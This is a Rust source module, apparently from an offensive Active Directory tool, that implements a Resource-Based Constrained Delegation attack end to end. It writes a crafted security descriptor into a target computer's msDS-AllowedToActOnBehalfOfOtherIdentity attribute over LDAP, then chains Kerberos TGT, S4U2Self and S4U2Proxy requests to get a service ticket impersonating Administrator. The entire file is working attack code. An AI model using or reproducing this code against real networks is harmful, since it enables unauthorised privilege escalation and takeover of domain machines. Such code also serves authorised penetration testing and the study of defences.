//! Resource-Based Constrained Delegation (RBCD) — Write to
//! msDS-AllowedToActOnBehalfOfOtherIdentity to allow a controlled
//! account to impersonate users to the target via S4U2Self+S4U2Proxy.
//!
//! Attack flow:
//! 1. Control an account with an SPN (or create a machine account)
//! 2. Write the controlled account's SID to the target's
//!    msDS-AllowedToActOnBehalfOfOtherIdentity attribute
//! 3. Perform S4U2Self → S4U2Proxy to get a ticket as admin to the target

use crate::runner::HuntConfig;
use colored::Colorize;
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::kerberos::{self};
use overthrone_core::proto::ldap;
use serde::{Deserialize, Serialize};
use tracing::{error, info, warn};

// ═══════════════════════════════════════════════════════════
// Configuration
// ═══════════════════════════════════════════════════════════

#[derive(Debug, Clone)]
pub struct RbcdConfig {
    /// The account we control that will do the impersonation
    /// (must have an SPN, e.g., a machine account we created)
    pub controlled_account: String,
    /// SID of the controlled account
    pub controlled_sid: String,
    /// Target computer to configure RBCD on
    pub target_computer: String,
    /// User to impersonate (default: Administrator)
    pub impersonate_user: String,
    /// Target SPN for the final S4U2Proxy (e.g., cifs/target.corp.local)
    pub target_spn: Option<String>,
    /// Only write the RBCD attribute, don't perform S4U
    pub write_only: bool,
    /// Cleanup: remove the RBCD attribute after exploitation
    pub cleanup: bool,
    /// Password/hash of the controlled account for TGT request
    pub controlled_secret: Option<String>,
    pub controlled_use_hash: bool,
}

impl Default for RbcdConfig {
    fn default() -> Self {
        Self {
            controlled_account: String::new(),
            controlled_sid: String::new(),
            target_computer: String::new(),
            impersonate_user: "Administrator".to_string(),
            target_spn: None,
            write_only: false,
            cleanup: false,
            controlled_secret: None,
            controlled_use_hash: false,
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Result
// ═══════════════════════════════════════════════════════════

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RbcdResult {
    pub target_computer: String,
    pub controlled_account: String,
    pub attribute_written: bool,
    pub s4u_success: bool,
    pub cleaned_up: bool,
    pub success: bool,
    pub error: Option<String>,
}

// ═══════════════════════════════════════════════════════════
// Security Descriptor Construction
// ═══════════════════════════════════════════════════════════

/// Build a minimal security descriptor (DACL) that grants the controlled
/// account's SID the right to act on behalf of other identities.
///
/// Format: raw binary SECURITY_DESCRIPTOR with a single ACE allowing
/// the controlled SID full delegation rights.
fn build_rbcd_security_descriptor(sid_string: &str) -> Result<Vec<u8>> {
    let sid_bytes = parse_sid_string(sid_string)?;
    let ace_size = (8 + sid_bytes.len()) as u16;

    // ACCESS_ALLOWED_ACE for the controlled SID
    let mut ace = Vec::new();
    ace.push(0x00); // AceType = ACCESS_ALLOWED_ACE_TYPE
    ace.push(0x00); // AceFlags
    ace.extend_from_slice(&ace_size.to_le_bytes()); // AceSize
    ace.extend_from_slice(&0x000F01FFu32.to_le_bytes()); // AccessMask (GENERIC_ALL)
    ace.extend_from_slice(&sid_bytes); // SID

    let acl_size = (8 + ace.len()) as u16;

    // ACL header
    let mut acl = Vec::new();
    acl.push(0x02); // AclRevision
    acl.push(0x00); // Sbz1
    acl.extend_from_slice(&acl_size.to_le_bytes()); // AclSize
    acl.extend_from_slice(&1u16.to_le_bytes()); // AceCount
    acl.extend_from_slice(&0u16.to_le_bytes()); // Sbz2
    acl.extend_from_slice(&ace);

    // SECURITY_DESCRIPTOR (self-relative)
    let sd_header_size = 20u32;
    let dacl_offset = sd_header_size;

    let mut sd = Vec::new();
    sd.push(0x01); // Revision
    sd.push(0x00); // Sbz1
    // Control: SE_DACL_PRESENT | SE_SELF_RELATIVE
    sd.extend_from_slice(&0x8004u16.to_le_bytes());
    sd.extend_from_slice(&0u32.to_le_bytes()); // OffsetOwner
    sd.extend_from_slice(&0u32.to_le_bytes()); // OffsetGroup
    sd.extend_from_slice(&0u32.to_le_bytes()); // OffsetSacl
    sd.extend_from_slice(&dacl_offset.to_le_bytes()); // OffsetDacl
    sd.extend_from_slice(&acl);

    Ok(sd)
}

/// Parse a SID string like "S-1-5-21-xxx-xxx-xxx-1234" into binary form
fn parse_sid_string(sid_str: &str) -> Result<Vec<u8>> {
    let parts: Vec<&str> = sid_str.split('-').collect();
    if parts.len() < 4 || parts[0] != "S" {
        return Err(OverthroneError::custom(format!(
            "Invalid SID string: {sid_str}"
        )));
    }

    let revision: u8 = parts[1]
        .parse()
        .map_err(|_| OverthroneError::custom("Invalid SID revision"))?;
    let authority: u64 = parts[2]
        .parse()
        .map_err(|_| OverthroneError::custom("Invalid SID authority"))?;

    let sub_authorities: Vec<u32> = parts[3..]
        .iter()
        .map(|p| {
            p.parse()
                .map_err(|_| OverthroneError::custom(format!("Invalid sub-authority: {p}")))
        })
        .collect::<std::result::Result<Vec<_>, _>>()?;

    let sub_authority_count = sub_authorities.len() as u8;

    let mut bytes = Vec::new();
    bytes.push(revision);
    bytes.push(sub_authority_count);
    // 6-byte big-endian authority
    bytes.extend_from_slice(&authority.to_be_bytes()[2..8]);
    for sa in &sub_authorities {
        bytes.extend_from_slice(&sa.to_le_bytes());
    }

    Ok(bytes)
}

// ═══════════════════════════════════════════════════════════
// LDAP Operations
// ═══════════════════════════════════════════════════════════

/// Write msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer
///
/// NOTE: You must add `modify_replace` to your LdapSession impl in
/// overthrone-core/src/proto/ldap.rs for this to compile. See bottom of file.
async fn write_rbcd_attribute(config: &HuntConfig, target_dn: &str, sd_bytes: &[u8]) -> Result<()> {
    info!(
        "LDAP: Writing msDS-AllowedToActOnBehalfOfOtherIdentity on {}",
        target_dn
    );

    let mut conn = ldap::LdapSession::connect(
        &config.dc_ip,
        &config.domain,
        &config.username,
        &config.secret,
        config.use_ldaps,
    )
    .await?;

    conn.modify_replace(
        target_dn,
        "msDS-AllowedToActOnBehalfOfOtherIdentity",
        sd_bytes,
    )
    .await?;

    conn.disconnect().await?;
    info!("LDAP: RBCD attribute written successfully");
    Ok(())
}

/// Remove msDS-AllowedToActOnBehalfOfOtherIdentity from the target
///
/// NOTE: You must add `modify_delete` to your LdapSession impl in
/// overthrone-core/src/proto/ldap.rs for this to compile. See bottom of file.
async fn clear_rbcd_attribute(config: &HuntConfig, target_dn: &str) -> Result<()> {
    info!("LDAP: Clearing RBCD attribute on {}", target_dn);

    let mut conn = ldap::LdapSession::connect(
        &config.dc_ip,
        &config.domain,
        &config.username,
        &config.secret,
        config.use_ldaps,
    )
    .await?;

    conn.modify_delete(target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity")
        .await?;

    conn.disconnect().await?;
    info!("LDAP: RBCD attribute cleared");
    Ok(())
}

/// Resolve a computer name to its DN via LDAP using enumerate_computers()
async fn resolve_computer_dn(config: &HuntConfig, computer_name: &str) -> Result<String> {
    let clean_name = computer_name.trim_end_matches('$');

    let mut conn = ldap::LdapSession::connect(
        &config.dc_ip,
        &config.domain,
        &config.username,
        &config.secret,
        config.use_ldaps,
    )
    .await?;

    let computers = conn.enumerate_computers().await?;
    conn.disconnect().await?;

    computers
        .iter()
        .find(|c| {
            c.sam_account_name
                .trim_end_matches('$')
                .eq_ignore_ascii_case(clean_name)
        })
        .map(|c| c.distinguished_name.clone())
        .ok_or_else(|| {
            OverthroneError::custom(format!("Computer '{}' not found in AD", computer_name))
        })
}

// ═══════════════════════════════════════════════════════════
// Public Runner
// ═══════════════════════════════════════════════════════════

pub async fn run(config: &HuntConfig, rc: &RbcdConfig) -> Result<RbcdResult> {
    info!("{}", "═══ RBCD ATTACK ═══".bold().red());

    if rc.controlled_account.is_empty() || rc.target_computer.is_empty() {
        return Err(OverthroneError::custom(
            "RBCD requires --controlled-account and --target-computer",
        ));
    }

    let mut result = RbcdResult {
        target_computer: rc.target_computer.clone(),
        controlled_account: rc.controlled_account.clone(),
        attribute_written: false,
        s4u_success: false,
        cleaned_up: false,
        success: false,
        error: None,
    };

    // Step 1: Resolve target computer DN
    let target_dn = resolve_computer_dn(config, &rc.target_computer).await?;
    info!("  Target DN: {}", target_dn.dimmed());

    // Step 2: Build and write the security descriptor
    let sd_bytes = build_rbcd_security_descriptor(&rc.controlled_sid)?;

    match write_rbcd_attribute(config, &target_dn, &sd_bytes).await {
        Ok(_) => {
            result.attribute_written = true;
            info!(
                " {} RBCD attribute written (SID: {})",
                "✓".green(),
                rc.controlled_sid.cyan()
            );
        }
        Err(e) => {
            result.error = Some(format!("Failed to write RBCD attribute: {e}"));
            error!(" {} RBCD write failed: {}", "✗".red(), e);
            return Ok(result);
        }
    }

    if rc.write_only {
        result.success = true;
        return Ok(result);
    }

    // Step 3: Request TGT for the controlled account
    let controlled_secret = rc.controlled_secret.as_deref().ok_or_else(|| {
        OverthroneError::custom("RBCD S4U requires controlled account credentials")
    })?;

    let tgt = kerberos::request_tgt(
        &config.dc_ip,
        &config.domain,
        &rc.controlled_account,
        controlled_secret,
        rc.controlled_use_hash,
    )
    .await?;

    info!(
        " {} TGT for {} obtained",
        "✓".green(),
        rc.controlled_account.bold()
    );

    // Step 4: S4U2Self → impersonate target user
    let s4u2self_ticket = kerberos::s4u2self(&config.dc_ip, &tgt, &rc.impersonate_user).await?;

    info!(
        " {} S4U2Self as {} obtained",
        "✓".green(),
        rc.impersonate_user.bold()
    );

    // Step 5: S4U2Proxy → get ticket for target service
    let target_spn = rc
        .target_spn
        .clone()
        .unwrap_or_else(|| format!("cifs/{}", rc.target_computer));

    match kerberos::s4u2proxy(&config.dc_ip, &tgt, &s4u2self_ticket, &target_spn).await {
        Ok(_service_ticket) => {
            result.s4u_success = true;
            result.success = true;
            info!(
                " {} S4U2Proxy ticket for {} as {} obtained!",
                "✓".green().bold(),
                target_spn.bold().cyan(),
                rc.impersonate_user.bold().red()
            );
        }
        Err(e) => {
            result.error = Some(format!("S4U2Proxy failed: {e}"));
            warn!(" {} S4U2Proxy failed: {}", "✗".red(), e);
        }
    }

    // Step 6: Cleanup (if requested)
    if rc.cleanup {
        match clear_rbcd_attribute(config, &target_dn).await {
            Ok(_) => {
                result.cleaned_up = true;
                info!(" {} RBCD attribute cleaned up", "✓".green());
            }
            Err(e) => {
                warn!(" {} Cleanup failed: {}", "⚠".yellow(), e);
            }
        }
    }

    Ok(result)
}
